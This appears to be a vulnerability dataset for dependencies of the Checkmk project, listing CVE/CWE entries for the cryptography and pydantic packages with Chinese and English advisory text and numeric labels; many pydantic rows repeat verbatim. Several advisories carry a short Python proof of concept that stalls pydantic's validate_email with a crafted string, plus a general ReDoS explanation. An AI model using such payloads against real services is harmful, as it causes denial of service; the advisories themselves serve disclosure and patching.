Checkmk_checkmk,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
Checkmk_checkmk,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
Checkmk_checkmk,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
Checkmk_checkmk,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
Checkmk_checkmk,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
Checkmk_checkmk,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
Checkmk_checkmk,pydantic,,True,CVE-2021-29510,CWE-835,2021-05-13,"pydantic是一个应用软件。使用Python类型提示进行数据验证和设置管理。
Pydantic 存在安全漏洞。该漏洞源于程序的验证将永远以100％的CPU使用率运行。",3,0
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
Checkmk_checkmk,pydantic,,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
Checkmk_checkmk,pydantic,,True,CVE-2021-29510,CWE-835,2021-05-13,"pydantic是一个应用软件。使用Python类型提示进行数据验证和设置管理。
Pydantic 存在安全漏洞。该漏洞源于程序的验证将永远以100％的CPU使用率运行。",3,0
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
Checkmk_checkmk,pydantic,,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
Checkmk_checkmk,pydantic,,True,CVE-2021-29510,CWE-835,2021-05-13,"pydantic是一个应用软件。使用Python类型提示进行数据验证和设置管理。
Pydantic 存在安全漏洞。该漏洞源于程序的验证将永远以100％的CPU使用率运行。",3,0
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
Checkmk_checkmk,pydantic,,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
Checkmk_checkmk,pydantic,,True,CVE-2021-29510,CWE-835,2021-05-13,"pydantic是一个应用软件。使用Python类型提示进行数据验证和设置管理。
Pydantic 存在安全漏洞。该漏洞源于程序的验证将永远以100％的CPU使用率运行。",3,0
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
